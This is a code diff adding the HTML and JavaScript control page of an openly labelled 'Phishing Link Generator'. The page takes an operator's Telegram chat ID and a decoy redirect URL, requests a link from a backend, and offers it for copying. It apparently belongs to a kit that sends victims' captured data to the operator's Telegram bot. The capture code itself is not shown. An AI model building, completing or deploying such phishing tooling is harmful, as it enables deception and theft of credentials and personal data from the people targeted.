@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Phishing Link Generator</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      max-width: 600px;
+      margin: 2rem auto;
+      padding: 1rem;
+    }
+    .container {
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      padding: 2rem;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+    }
+    h1 {
+      color: #333;
+      text-align: center;
+    }
+    .input-group {
+      margin-bottom: 1.5rem;
+    }
+    label {
+      display: block;
+      margin-bottom: 0.5rem;
+      font-weight: bold;
+    }
+    input[type="text"],
+    input[type="url"] {
+      width: 100%;
+      padding: 0.8rem;
+      border: 1px solid #ddd;
+      border-radius: 4px;
+      font-size: 16px;
+    }
+    button {
+      background: #4CAF50;
+      color: white;
+      border: none;
+      padding: 1rem 1.5rem;
+      border-radius: 4px;
+      font-size: 16px;
+      cursor: pointer;
+      width: 100%;
+      font-weight: bold;
+    }
+    #result {
+      margin-top: 1.5rem;
+      padding: 1rem;
+      background: #f9f9f9;
+      border-radius: 4px;
+      display: none;
+    }
+    #copyBtn {
+      background: #2196F3;
+      margin-top: 0.5rem;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>🔗 Phishing Link Generator</h1>
+    
+    <div class="input-group">
+      <label for="telegramId">Telegram Chat ID:</label>
+      <input type="text" id="telegramId" placeholder="Send /start to your bot to get ID">
+    </div>
+    
+    <div class="input-group">
+      <label for="redirectUrl">Redirect URL (Optional):</label>
+      <input type="url" id="redirectUrl" placeholder="https://example.com">
+    </div>
+    
+    <button id="generateBtn">Generate Link</button>
+    
+    <div id="result">
+      <p>Generated Link (Expires in 24h):</p>
+      <a id="generatedLink" target="_blank" style="word-break: break-all;"></a>
+      <button id="copyBtn">Copy Link</button>
+    </div>
+  </div>
+
+  <script>
+    document.getElementById('generateBtn').addEventListener('click', async () => {
+      const telegramId = document.getElementById('telegramId').value.trim();
+      const redirectUrl = document.getElementById('redirectUrl').value.trim() || 'https://google.com';
+      
+      if (!telegramId) {
+        alert('Please enter Telegram Chat ID');
+        return;
+      }
+      
+      try {
+        const response = await fetch('/api/generate', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ telegramId, redirectUrl })
+        });
+        
+        const data = await response.json();
+        
+        document.getElementById('generatedLink').href = data.link;
+        document.getElementById('generatedLink').textContent = data.link;
+        document.getElementById('result').style.display = 'block';
+      } catch (error) {
+        alert('Error generating link');
+      }
+    });
+    
+    document.getElementById('copyBtn').addEventListener('click', () => {
+      const link = document.getElementById('generatedLink').textContent;
+      navigator.clipboard.writeText(link);
+      alert('Link copied to clipboard!');
+    });
+  </script>
+</body>
+</html>
